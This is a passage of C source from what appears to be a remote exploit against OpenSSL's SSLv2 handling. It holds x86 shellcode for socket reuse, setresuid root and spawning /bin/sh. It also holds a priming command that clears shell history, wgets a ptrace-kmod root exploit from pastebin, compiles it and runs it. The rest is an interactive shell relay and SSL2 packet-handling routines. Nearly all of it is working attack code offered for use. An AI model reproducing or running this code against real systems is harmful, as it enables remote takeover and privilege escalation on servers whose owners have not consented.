&nbsp; &nbsp; "\x31\xc9" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* xorl &nbsp; &nbsp;%ecx,%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\xb1\xff" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movb &nbsp; &nbsp;$0xff,%cl &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x89\x0f" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movl &nbsp; &nbsp;%ecx,(%edi) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x51" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* pushl &nbsp; %ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */<br/>
&nbsp; &nbsp; "\x31\xc0" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* xorl &nbsp; &nbsp;%eax,%eax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\xb0\x66" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movb &nbsp; &nbsp;$0x66,%al &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\xb3\x07" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movb &nbsp; &nbsp;$0x07,%bl &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x89\xf9" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movl &nbsp; &nbsp;%edi,%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\xcd\x80" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* int &nbsp; &nbsp; $0x80 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x59" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* popl &nbsp; &nbsp;%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */<br/>
&nbsp; &nbsp; "\x31\xdb" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* xorl &nbsp; &nbsp;%ebx,%ebx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x39\xd8" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* cmpl &nbsp; &nbsp;%ebx,%eax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x75\x0a" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* jne &nbsp; &nbsp; &lt;findsckcode+54&gt; &nbsp; &nbsp; &nbsp; */<br/>
&nbsp; &nbsp; "\x66\xb8\x12\x34" &nbsp; &nbsp; /* movw &nbsp; &nbsp;$0x1234,%bx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x66\x39\x46\x02" &nbsp; &nbsp; /* cmpw &nbsp; &nbsp;%bx,0x2(%esi) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x74\x02" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* je &nbsp; &nbsp; &nbsp;&lt;findsckcode+56&gt; &nbsp; &nbsp; &nbsp; */<br/>
&nbsp; &nbsp; "\xe2\xe0" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* loop &nbsp; &nbsp;&lt;findsckcode+24&gt; &nbsp; &nbsp; &nbsp; */<br/>
&nbsp; &nbsp; "\x89\xcb" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movl &nbsp; &nbsp;%ecx,%ebx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x31\xc9" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* xorl &nbsp; &nbsp;%ecx,%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\xb1\x03" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movb &nbsp; &nbsp;$0x03,%cl &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x31\xc0" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* xorl &nbsp; &nbsp;%eax,%eax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\xb0\x3f" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movb &nbsp; &nbsp;$0x3f,%al &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x49" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* decl &nbsp; &nbsp;%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */<br/>
&nbsp; &nbsp; "\xcd\x80" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* int &nbsp; &nbsp; $0x80 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x41" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* incl &nbsp; &nbsp;%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */<br/>
&nbsp; &nbsp; "\xe2\xf6" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* loop &nbsp; &nbsp;&lt;findsckcode+62&gt; &nbsp; &nbsp; &nbsp; */<br/>
<br/>
/* 10 byte setresuid(0,0,0); by core */<br/>
&nbsp; &nbsp; &nbsp;"\x31\xc9" &nbsp; &nbsp; &nbsp; /* xor &nbsp; &nbsp;%ecx,%ecx */<br/>
&nbsp; &nbsp; &nbsp;"\xf7\xe1" &nbsp; &nbsp; &nbsp; /* mul &nbsp; &nbsp;%ecx,%eax */<br/>
&nbsp; &nbsp; &nbsp;"\x51" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* push &nbsp; %ecx */<br/>
&nbsp; &nbsp; &nbsp;"\x5b" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* pop &nbsp; &nbsp;%ebx */<br/>
&nbsp; &nbsp; &nbsp;"\xb0\xa4" &nbsp; &nbsp; &nbsp; /* mov &nbsp; &nbsp;$0xa4,%al */<br/>
&nbsp; &nbsp; &nbsp;"\xcd\x80" &nbsp; &nbsp; &nbsp; /* int &nbsp; &nbsp;$0x80 */<br/>
<br/>
&nbsp; &nbsp; <br/>
/* bigger shellcode added by spabam */<br/>
<br/>
/* "\xB8\x2F\x73\x68\x23\x25\x2F\x73\x68\xDC\x50\x68\x2F\x62\x69"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "\x6E\x89\xE3\x31\xC0\x50\x53\x89\xE1\x04\x0B\x31\xD2\xCD\x80"<br/>
*/<br/>
<br/>
<br/>
/* 24 bytes execl("/bin/sh", "/bin/sh", 0); by LSD-pl */<br/>
&nbsp; &nbsp; "\x31\xc0" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* xorl &nbsp; &nbsp;%eax,%eax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x50" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* pushl &nbsp; %eax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */<br/>
&nbsp; &nbsp; "\x68""//sh" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* pushl &nbsp; $0x68732f2f &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x68""/bin" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* pushl &nbsp; $0x6e69622f &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x89\xe3" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movl &nbsp; &nbsp;%esp,%ebx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x50" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* pushl &nbsp; %eax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */<br/>
&nbsp; &nbsp; "\x53" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* pushl &nbsp; %ebx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */<br/>
&nbsp; &nbsp; "\x89\xe1" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movl &nbsp; &nbsp;%esp,%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x99" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* cdql &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */<br/>
&nbsp; &nbsp; "\xb0\x0b" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movb &nbsp; &nbsp;$0x0b,%al &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\xcd\x80"; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* int &nbsp; &nbsp; $0x80 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
<br/>
/* read and write buffer*/<br/>
#define BUFSIZE 16384<br/>
<br/>
/* hardcoded protocol stuff */<br/>
#define CHALLENGE_LENGTH 16<br/>
#define RC4_KEY_LENGTH 16 &nbsp; &nbsp; &nbsp; /* 128 bits */<br/>
#define RC4_KEY_MATERIAL_LENGTH (RC4_KEY_LENGTH*2)<br/>
<br/>
/* straight from the openssl source */<br/>
#define n2s(c,s) &nbsp; &nbsp;((s=(((unsigned int)(c[0]))&lt;&lt; 8)| (((unsigned int)(c[1])) &nbsp; &nbsp;)),c+=2)<br/>
#define s2n(s,c) &nbsp; &nbsp;((c[0]=(unsigned char)(((s)&gt;&gt; 8)&amp;0xff), c[1]=(unsigned char)(((s) &nbsp; &nbsp;)&amp;0xff)),c+=2)<br/>
<br/>
/* we keep all SSL2 state in this structure */<br/>
typedef struct {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int sock;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; /* client stuff */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char challenge[CHALLENGE_LENGTH];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char master_key[RC4_KEY_LENGTH];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char key_material[RC4_KEY_MATERIAL_LENGTH];<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; /* connection id - returned by the server */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int conn_id_length;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; /* server certificate */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; X509 *x509;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; /* session keys */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char* read_key;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char* write_key;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; RC4_KEY* rc4_read_key;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; RC4_KEY* rc4_write_key;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; /* sequence numbers, used for MAC calculation */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int read_seq;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int write_seq;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; /* set to 1 when the SSL2 handshake is complete */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int encrypted;<br/>
} ssl_conn;<br/>
<br/>
#define COMMAND1 "TERM=xterm; export TERM=xterm; exec bash -i\n"<br/>
// #define COMMAND2 "unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"<br/>
<br/>
#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://pastebin.com/raw/C7v25Xr9 -O ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"<br/>
<br/>
long getip(char *hostname) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; struct hostent *he;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; long ipaddr;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if ((ipaddr = inet_addr(hostname)) &lt; 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ((he = gethostbyname(hostname)) == NULL) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror("gethostbyname()");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(-1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memcpy(&amp;ipaddr, he-&gt;h_addr, he-&gt;h_length);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; return ipaddr;<br/>
}<br/>
<br/>
/* mixter's code w/enhancements by core */<br/>
<br/>
int sh(int sockfd) {<br/>
&nbsp; &nbsp;char snd[1024], rcv[1024];<br/>
&nbsp; &nbsp;fd_set rset;<br/>
&nbsp; &nbsp;int maxfd, n;<br/>
<br/>
&nbsp; &nbsp;/* Priming commands */<br/>
&nbsp; &nbsp;strcpy(snd, COMMAND1 "\n");<br/>
&nbsp; &nbsp;write(sockfd, snd, strlen(snd));<br/>
<br/>
&nbsp; &nbsp;strcpy(snd, COMMAND2 "\n");<br/>
&nbsp; &nbsp;write(sockfd, snd, strlen(snd));<br/>
<br/>
&nbsp; &nbsp;/* Main command loop */<br/>
&nbsp; &nbsp;for (;;) {<br/>
&nbsp; &nbsp; &nbsp; FD_SET(fileno(stdin), &amp;rset);<br/>
&nbsp; &nbsp; &nbsp; FD_SET(sockfd, &amp;rset);<br/>
<br/>
&nbsp; &nbsp; &nbsp; maxfd = ( ( fileno(stdin) &gt; sockfd )?fileno(stdin):sockfd ) + 1;<br/>
&nbsp; &nbsp; &nbsp; select(maxfd, &amp;rset, NULL, NULL, NULL);<br/>
<br/>
&nbsp; &nbsp; &nbsp; if (FD_ISSET(fileno(stdin), &amp;rset)) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bzero(snd, sizeof(snd));<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;fgets(snd, sizeof(snd)-2, stdin);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;write(sockfd, snd, strlen(snd));<br/>
&nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; if (FD_ISSET(sockfd, &amp;rset)) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bzero(rcv, sizeof(rcv));<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("Good Bye!\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 0;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if (n &lt; 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror("read");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 1;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;fputs(rcv, stdout);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;fflush(stdout); /* keeps output nice */<br/>
&nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp;} /* for(;;) */<br/>
}<br/>
<br/>
/* Returns the local port of a connected socket */<br/>
int get_local_port(int sock)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; struct sockaddr_in s_in;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned int namelen = sizeof(s_in);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (getsockname(sock, (struct sockaddr *)&amp;s_in, &amp;namelen) &lt; 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("Can't get local port: %s\n", strerror(errno));<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; return s_in.sin_port;<br/>
}<br/>
<br/>
/* Connect to a host */<br/>
int connect_host(char* host, int port)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; struct sockaddr_in s_in;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int sock;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; s_in.sin_family = AF_INET;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; s_in.sin_addr.s_addr = getip(host);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; s_in.sin_port = htons(port);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if ((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt;= 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("Could not create a socket\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (connect(sock, (struct sockaddr *)&amp;s_in, sizeof(s_in)) &lt; 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("Connection to %s:%d failed: %s\n", host, port, strerror(errno));<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; return sock;<br/>
}<br/>
<br/>
/* Create a new ssl conn structure and connect to a host */<br/>
ssl_conn* ssl_connect_host(char* host, int port)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl_conn* ssl;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (!(ssl = (ssl_conn*) malloc(sizeof(ssl_conn)))) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("Can't allocate memory\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; /* Initialize some values */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;encrypted = 0;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;write_seq = 0;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;read_seq = 0;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;sock = connect_host(host, port);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; return ssl;<br/>
}<br/>
<br/>
/* global buffer used by the ssl result() */<br/>
char res_buf[30];<br/>
<br/>
/* converts an SSL error code to a string */<br/>
char* ssl_error(int code) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; switch (code) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; case 0x00: &nbsp; &nbsp; &nbsp;return "SSL2 PE UNDEFINED ERROR (0x00)";<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; case 0x01: &nbsp; &nbsp; &nbsp;return "SSL2 PE NO CIPHER (0x01)";<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; case 0x02: &nbsp; &nbsp; &nbsp;return "SSL2 PE NO CERTIFICATE (0x02)";<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; case 0x04: &nbsp; &nbsp; &nbsp;return "SSL2 PE BAD CERTIFICATE (0x03)";<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; case 0x06: &nbsp; &nbsp; &nbsp;return "SSL2 PE UNSUPPORTED CERTIFICATE TYPE (0x06)";<br/>
&nbsp; &nbsp; &nbsp; &nbsp; default:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sprintf(res_buf, "%02x", code);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return res_buf;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
}<br/>
<br/>
/* read len bytes from a socket. boring. */<br/>
int read_data(int sock, unsigned char* buf, int len)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int l;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int to_read = len;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; do {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ((l = read(sock, buf, to_read)) &lt; 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("Error in read: %s\n", strerror(errno));<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; to_read -= len;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; } while (to_read &gt; 0);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; return len;<br/>
}<br/>
<br/>
/* reads an SSL packet and decrypts it if necessery */<br/>
int read_ssl_packet(ssl_conn* ssl, unsigned char* buf, int buf_size)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int rec_len, padding;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; read_data(ssl-&gt;sock, buf, 2);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if ((buf[0] &amp; 0x80) == 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* three byte header */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rec_len = ((buf[0] &amp; 0x3f) &lt;&lt; 8) | buf[1];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; read_data(ssl-&gt;sock, &amp;buf[2], 1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; padding = (int)buf[2];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* two byte header */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rec_len = ((buf[0] &amp; 0x7f) &lt;&lt; 8) | buf[1];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; padding = 0;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if ((rec_len &lt;= 0) || (rec_len &gt; buf_size)) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("read_ssl_packet: Record length out of range (rec_len = %d)\n", rec_len); <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; read_data(ssl-&gt;sock, buf, rec_len);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (ssl-&gt;encrypted) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (MD5_DIGEST_LENGTH + padding &gt;= rec_len) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ((buf[0] == SSL2_MT_ERROR) &amp;&amp; (rec_len == 3)) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* the server didn't switch to encryption due to an error */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 0;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("read_ssl_packet: Encrypted message is too short (rec_len = %d)\n", rec_len);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* decrypt the encrypted part of the packet */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RC4(ssl-&gt;rc4_read_key, rec_len, buf, buf);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* move the decrypted message in the beginning of the buffer */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rec_len = rec_len - MD5_DIGEST_LENGTH - padding;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memmove(buf, buf + MD5_DIGEST_LENGTH, rec_len);<br/>
